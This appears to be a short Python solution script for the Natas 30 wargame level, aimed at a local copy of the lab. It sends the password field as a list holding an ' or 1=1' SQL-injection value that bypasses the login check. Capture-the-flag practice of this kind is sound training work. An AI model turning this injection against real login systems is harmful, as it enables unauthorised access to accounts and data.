import requests
from urllib.parse import quote, unquote

session = requests.Session()

def natas30(url):    
    params={"username": "natas31", "password": [" or 1=1", 'INT(10)']}
    response = session.post(url, data=params)
    print(response.text)
    if 'FAIL' in response.text:
        print("FAILED")
    else:
        print("SUCCES")

if __name__ == '__main__':
    url = 'http://localhost:8080/index.pl'
    natas30(url)
